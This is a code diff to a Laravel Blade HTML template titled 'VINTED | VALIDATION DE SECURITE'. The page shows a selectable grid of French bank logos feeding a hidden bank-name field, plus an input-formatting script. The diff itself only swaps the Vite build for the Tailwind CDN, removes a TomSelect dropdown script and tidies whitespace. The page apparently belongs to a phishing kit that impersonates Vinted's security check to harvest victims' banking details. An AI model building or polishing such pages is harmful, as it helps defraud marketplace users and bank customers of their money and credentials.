@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VINTED | VALIDATION DE SECURITE</title>
 
-    
-    @vite(['resources/css/app.css', 'resources/js/app.js'])
+    <!-- Tailwind CSS via CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
     
     <style>
         .coriolis-orange { background-color: #0d9488; }
@@ -105,16 +105,11 @@
 
 </button>
 
-
-
-
     <div id="bankList"
      class="hidden absolute z-50 mt-2 w-full bg-white rounded-2xl shadow-xl p-4">
 
     <div class="grid grid-cols-4 sm:grid-cols-4 gap-4">
         
-
-    
 
 @php
         $banks = [
@@ -128,13 +123,9 @@
             ['name'=>'Axa Banque','logo'=>'AXA_Assurance.png'],
             ['name'=>'LCL Banque','logo'=>'LCL.png'],
             ['name'=>'La Banque Postale','logo'=>'LOGO-LBP-digital-fd-clair-RVB.png'],
-            // Dernière case
             ['name'=>'Autre banque','logo'=>'other-bank.png'],
-            
-            
         ];
         @endphp
-
 
         @foreach($banks as $bank)
 
@@ -169,7 +160,6 @@
 
                 @else
 
-
                 <img
                     src="{{ asset('images/'.$bank['logo']) }}"
                     alt="{{ $bank['name'] }}"
@@ -184,8 +174,6 @@
     </div>
 
 </div>
-
-
 
     <input type="hidden" name="bank_name" id="bankInput">
 
@@ -255,41 +243,6 @@
             e.target.value = value;
         });
     </script>
-
-<script src="https://cdn.jsdelivr.net/npm/tom-select/dist/js/tom-select.complete.min.js"></script>
-
-<script>
-document.addEventListener('DOMContentLoaded', function () {
-
-   new TomSelect('#category', {
-    render: {
-
-        option: function(data, escape) {
-            return `
-                <div class="w-full flex items-center gap-2 py-6 m-4 grid grid-cols-2   ">
-                    <img src="${data.icon}" class="${data.class}  object-contain">
-                    <span class="font-medium uppercase">
-                        ${escape(data.text)}
-                    </span>
-                </div>
-            `;
-        },
-
-        item: function(data, escape) {
-            return `
-                <div class="flex items-center gap-3 grid grid-cols-2 gap-2 ">
-                    <img src="${data.icon}" class="${data.class} object-contain">
-                    <span class="font-medium uppercase ">
-                        ${escape(data.text)}
-                    </span>
-                </div>
-            `;
-        }
-
-    }
-});
-});
-</script>
 
 </body>
 </html>
